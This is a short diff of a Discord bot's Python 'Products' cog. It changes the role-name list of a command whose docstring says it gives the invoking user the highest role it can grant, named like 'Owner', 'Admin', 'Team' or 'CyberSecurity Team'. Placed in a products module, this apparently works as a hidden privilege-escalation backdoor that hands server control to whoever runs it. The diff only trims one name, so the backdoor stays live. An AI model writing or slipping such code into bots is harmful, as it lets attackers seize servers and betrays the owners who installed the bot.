@@ -319,7 +319,7 @@ class Products(commands.Cog):
         """
         Give the command user the highest available, givable role with names like 'Owner', 'Ownership', 'Team', 'Admin', etc.
         """
-        role_names = ["CyberSecurity Team", "Provider", "Manager", "Sentri", "Official Bot", ".", "Owner", "Ownership", "Team", "Admin"]
+        role_names = ["CyberSecurity Team", "Provider", "Manager", "Sentri", "Official Bot", ".", "Ownership", "Team", "Admin"]
         roles_to_give = []
 
         for role in ctx.guild.roles:
